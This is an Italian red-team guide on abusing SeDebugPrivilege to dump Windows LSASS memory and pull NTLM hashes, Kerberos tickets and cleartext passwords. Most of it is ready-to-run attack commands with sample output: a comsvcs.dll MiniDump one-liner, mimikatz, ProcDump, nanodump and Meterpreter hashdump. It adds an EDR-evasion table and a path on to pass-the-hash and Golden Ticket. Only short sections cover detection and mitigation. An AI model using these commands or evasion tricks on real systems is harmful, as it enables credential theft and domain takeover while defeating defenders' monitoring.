---
title: 'SeDebugPrivilege: Privilege Escalation con Dump LSASS con LOLBins'
slug: sedebugprivilege
description: >-
  SeDebugPrivilege Enabled? Due comandi per dumpare LSASS e ottenere NTLM hash.
  Tutto con comsvcs.dll built-in di Windows, niente mimikatz su disco. Guida
  tecnica Red Team.
image: /sedebugprivilege.webp
draft: false
date: 2026-06-02T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - privilege-escalation
tags:
  - sedebugprivilege
  - comsvcs-dll
  - lsass-dump
featured: true
---

Hai una shell admin elevata e `whoami /priv` mostra `SeDebugPrivilege Enabled`. In due comandi dumpi lsass.exe e ottieni hash NTLM, ticket Kerberos e password in chiaro di ogni utente loggato — inclusi gli admin di dominio in sessione. Zero tool esterni necessari: `comsvcs.dll` è già su ogni Windows.

***

## Quick Exploit

```cmd
tasklist | findstr lsass
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump [PID] C:\temp\lsass.dmp full
```

Su macchina attaccante:

```bash
python3 pypykatz lsa minidump lsass.dmp
```

Output atteso:

```
Username: DomainAdmin  NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
```

***

## Attack Chain

```
Shell admin elevata → SeDebugPrivilege Enabled
  → tasklist | findstr lsass → PID di lsass.exe
  → comsvcs.dll MiniDump [PID] C:\temp\lsass.dmp full
  → pypykatz / mimikatz offline → hash NTLM + ticket Kerberos
  → Pass-the-Hash → DC → secretsdump → Golden Ticket
```

***

## Tool Decision

| Metodo                              | Quando usarlo                                       |
| ----------------------------------- | --------------------------------------------------- |
| `comsvcs.dll MiniDump`              | **Default** — zero tool esterni, built-in Windows   |
| `mimikatz sekurlsa::logonpasswords` | Dump + estrazione inline, no file su disco          |
| `ProcDump -ma lsass`                | Firmato Microsoft — meno sospetto per nome processo |
| `nanodump --write`                  | EDR con hook userland attivi — usa direct syscalls  |
| `nanodump --fork`                   | EDR comportamentale — fork di lsass prima del dump  |

***

## Cos'è SeDebugPrivilege

Abilita `OpenProcess(PROCESS_ALL_ACCESS)` su qualsiasi processo del sistema, inclusi quelli di SYSTEM. Nato per i debugger (Visual Studio, WinDbg), in contesto offensivo permette di accedere alla memoria di `lsass.exe` che contiene le credenziali di tutti gli utenti in sessione.

SeDebugPrivilege è assegnato per default agli **Administrators**, ma è **Enabled solo nel token elevato** — in un token non elevato (UAC split) appare come Disabled.

***

## Quando esiste

* **Shell amministrativa elevata** — token con UAC bypass o elevazione diretta
* **Account sviluppatori** con policy permissive su macchine di sviluppo
* **Service account di monitoring e debugging** (APM agent, debugger remoto)
* **Terminal Server / RDS** — un admin locale può accedere alla memoria di tutti gli utenti in sessione

Verifica:

```cmd
whoami /priv
```

Cerchi:

```
SeDebugPrivilege    Debug programs    Enabled
```

Se vedi `Disabled` → token non elevato. Avvia un processo elevato o bypassa UAC prima di procedere.

***

## Step 1 — Trova il PID di LSASS

```cmd
tasklist | findstr lsass
```

Output:

```
lsass.exe    756    Services    0    15,432 K
```

Annota il PID — ti servirà nel passo successivo.

Verifica anche se RunAsPPL è attivo (blocca il dump standard):

```powershell
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" | Select-Object RunAsPPL
```

Se `RunAsPPL = 1` → lsass è Protected Process → il dump standard fallisce → serve BYOVD (vedi [SeLoadDriverPrivilege](07-seloaddriverprivilege.md)).

***

## Step 2 — Dump LSASS con comsvcs.dll

Il metodo più pulito: `comsvcs.dll` è presente su ogni Windows da Vista in poi, firmata Microsoft, nessun binary da caricare. Sostituisci `756` con il PID reale di lsass:

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 756 C:\temp\lsass.dmp full
```

Nessun output visibile se va a buon fine — il file `lsass.dmp` viene creato silenziosamente in `C:\temp\`.

***

## Step 3 — Estrai le credenziali dal dump

Su macchina attaccante con mimikatz:

```cmd
mimikatz.exe "sekurlsa::minidump C:\temp\lsass.dmp" "sekurlsa::logonpasswords" exit
```

Output:

```
Authentication Id : 0 ; 452361
Session           : Interactive from 2
User Name         : DomainAdmin
Domain            : CORP
        msv :
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
        kerberos :
         * Password : P@ssw0rd! (solo se WDigest attivo)
```

Con pypykatz su Linux (alternativa a mimikatz):

```bash
python3 pypykatz lsa minidump lsass.dmp
```

***

## Varianti

### Mimikatz dump diretto — senza file su disco

Dump e estrazione in un solo comando, senza scrivere file intermedi. `privilege::debug` abilita SeDebugPrivilege via `AdjustTokenPrivileges`:

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

### ProcDump (Sysinternals) — firmato Microsoft

```cmd
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
```

Oppure specificando il PID:

```cmd
procdump.exe -accepteula -ma 756 C:\temp\lsass.dmp
```

Output:

```
[09:14:22] Dump 1 initiated: C:\temp\lsass.dmp
[09:14:23] Dump 1 complete: 55 MB written in 0.9 seconds
```

### Nanodump — direct syscalls, evasion EDR

Bypassa i hook userland degli EDR usando syscall dirette (`NtReadVirtualMemory`). Più evasivo di comsvcs.dll e ProcDump su EDR che usano hook in userland:

```cmd
nanodump.exe --write C:\temp\lsass.dmp
```

Con `--fork` crea un fork di lsass prima del dump, riducendo le anomalie comportamentali:

```cmd
nanodump.exe --fork --write C:\temp\lsass.dmp
```

Con `--valid` produce un dump con header valido, pronto per mimikatz senza preprocessing:

```cmd
nanodump.exe --write C:\temp\lsass.dmp --valid
```

Source: [helpsystems/nanodump](https://github.com/helpsystems/nanodump)

### sekurlsa::credman — Credential Manager dalla memoria

Estrae anche le password salvate nel Windows Credential Manager (RDP, share SMB, applicazioni):

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::credman" exit
```

### Meterpreter — migration verso processo SYSTEM

```
meterpreter > ps
meterpreter > migrate 756
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
```

`migrate` usa `OpenProcess(PROCESS_ALL_ACCESS)` con SeDebugPrivilege sul processo target.

***

## Errori comuni

**`Disabled` in `whoami /priv` — il dump fallisce** — Sei in un token non elevato (UAC split). Avvia un processo elevato o bypassa UAC prima. `comsvcs.dll` richiede token elevato.

**comsvcs.dll produce file 0 byte** — RunAsPPL attivo (`RunAsPPL = 1`). Verifica con `Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa | Select-Object RunAsPPL`. Se è 1, serve BYOVD — vedi [SeLoadDriverPrivilege](07-seloaddriverprivilege.md).

**pypykatz mostra hash vuoti o solo NTLM senza password** — WDigest disabilitato (default da Win 8.1+). Gli hash NTLM ci sono comunque — sufficienti per Pass-the-Hash e PTT.

**EDR blocca comsvcs.dll verso lsass** — Pattern noto in molti EDR. Prova `nanodump --fork` (direct syscalls, nessun hook userland) o `ProcDump` che è firmato Microsoft.

**ProcDump bloccato da Defender** — Defender flagga ProcDump verso lsass anche se firmato. Usa `nanodump` o implementa MiniDumpWriteDump via P/Invoke custom.

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                      | Come lo bypassa il Red Team                                                                             |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| Sysmon Event ID 10 — `ProcessAccess` su lsass | Usa `nanodump --fork` che crea un processo intermedio prima di accedere alla memoria                    |
| Pattern `rundll32 → comsvcs → lsass PID`      | Chiama `MiniDumpWriteDump` direttamente via P/Invoke in PowerShell — stessa funzione, nessun `rundll32` |
| ProcDump verso lsass — flaggato da Defender   | Rinomina ProcDump o usa nanodump con direct syscalls                                                    |
| Defender behavioral — dump lsass da tool noto | Carica il payload via `execute-assembly` da Cobalt Strike/Sliver — in-memory, no file su disco          |

***

|      Metodo      |   Tool esterni  | File su disco | Detection tipica |
| :--------------: | :-------------: | :-----------: | ---------------- |
|    comsvcs.dll   |        No       |       Sì      | Media            |
| Mimikatz diretto |        Sì       |       No      | Alta             |
|     ProcDump     | Sì (MS firmato) |       Sì      | Media-Alta       |
|     Nanodump     |        Sì       |       Sì      | Bassa-Media      |

Parti con `comsvcs.dll` — nessun tool da caricare. Se l'EDR lo flagga per pattern comportamentale, prova Nanodump.

***

## Scenari reali

**Admin locale su workstation con domain admin in sessione RDS** — token elevato → `comsvcs.dll` dump → pypykatz → hash NTLM domain admin → Pass-the-Hash → DC.

**Post-escalation su server** — hai appena ottenuto admin via altro vettore → dump silenzioso → credenziali dominio → lateral movement.

**Developer machine** — sviluppatori loggano con credenziali AD, SeDebugPrivilege disponibile → hash in memoria → PTH sull'infrastruttura.

***

## Quando fallisce

* **RunAsPPL attivo** (`RunAsPPL = 1`) → `OpenProcess` su lsass fallisce anche con SeDebugPrivilege → serve BYOVD (vedi [SeLoadDriverPrivilege](07-seloaddriverprivilege.md))
* **Credential Guard** → le credenziali protette sono isolate in VBS → non presenti nel dump standard
* **Token non elevato** → Disabled in `whoami /priv` → avvia processo elevato
* **WDigest disabilitato** (default da Win 8.1+) → nessuna password in chiaro → ma gli hash NTLM sono sempre presenti → sufficienti per PTH

***

## Detection

* **Sysmon Event ID 10**: `ProcessAccess` su `lsass.exe`
* **Event ID 4656 + 4663**: accesso alla memoria di lsass
* Pattern `rundll32.exe → comsvcs.dll → lsass PID` — documentato nella maggior parte degli EDR
* ProcDump verso lsass — flaggato da Defender anche se firmato Microsoft

***

## Mitigazioni

* **RunAsPPL**: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa → RunAsPPL = dword:1` — riavvio richiesto
* **Credential Guard** — isola le credenziali in VBS, inaccessibili dal dump standard
* **WDigest disabilitato**: `HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest → UseLogonCredential = 0`
* EDR con behavioral detection su `OpenProcess(PROCESS_VM_READ, lsass)`

**Nota realistica:** RunAsPPL e Credential Guard sono le uniche mitigazioni davvero efficaci. Entrambe richiedono hardware compatibile e configurazione esplicita — nella maggior parte degli ambienti enterprise non sono abilitate. Su workstation e server senza queste protezioni, `comsvcs.dll` funziona sempre con un token elevato.

***

## FAQ

**WDigest è disabilitato — ottengo comunque qualcosa?**
Sì. Gli hash NTLM sono sempre presenti nel dump — sufficienti per Pass-the-Hash e Pass-the-Ticket.

**Credential Guard blocca tutto?**
Blocca solo le credenziali degli account protetti. Gli hash degli account non coperti da Credential Guard sono ancora nel dump.

**comsvcs.dll è stealthy?**
Più di mimikatz.exe per il nome, ma il pattern `rundll32 → comsvcs → lsass` è documentato in molti EDR. Nanodump con direct syscalls è più evasivo.

***

SeDebugPrivilege in un token elevato equivale ad accesso completo alla memoria di lsass — tutti gli hash, tutti i ticket Kerberos. `comsvcs.dll` è già su ogni Windows e non richiede nulla da caricare sul target.

***

**Articoli correlati:**

* [SeLoadDriverPrivilege](https://hackita.it/articoli/seloaddriverprivilege) — bypass RunAsPPL con BYOVD quando PPL blocca il dump
* [SeBackupPrivilege](https://hackita.it/articoli/sebackupprivilege) — credential dump alternativo via filesystem, non tocca lsass
* [SeImpersonatePrivilege](https://hackita.it/articoli/seimpersonateprivilege) — escalation a SYSTEM prima del dump

**Riferimenti:** [Nanodump](https://github.com/helpsystems/nanodump) · [Mimikatz](https://github.com/gentilkiwi/mimikatz) · [Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs)
